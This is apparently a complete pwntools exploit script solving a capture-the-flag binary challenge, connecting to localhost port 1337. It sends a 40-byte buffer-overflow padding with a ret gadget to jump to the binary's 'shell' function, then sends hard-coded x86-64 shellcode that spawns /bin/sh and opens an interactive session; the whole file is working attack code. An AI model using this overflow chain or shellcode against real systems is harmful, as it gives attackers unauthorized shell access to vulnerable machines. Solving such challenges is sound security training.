from pwn import *

exe = './chall'
elf = ELF(exe)
context.binary = exe
context.arch = 'amd64'

# p = process(exe)
p = remote("localhost", 1337)

offset = 40
padding = b'A' * offset

rop = ROP(exe)
ret_gadget = rop.find_gadget(['ret'])[0]

target_addr = elf.symbols['shell']

payload_1 = padding + p64(ret_gadget) + p64(target_addr)

p.sendline(payload_1)

shellcode = b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"

print(f"Panjang Shellcode: {len(shellcode)} bytes")

p.send(shellcode)

p.interactive()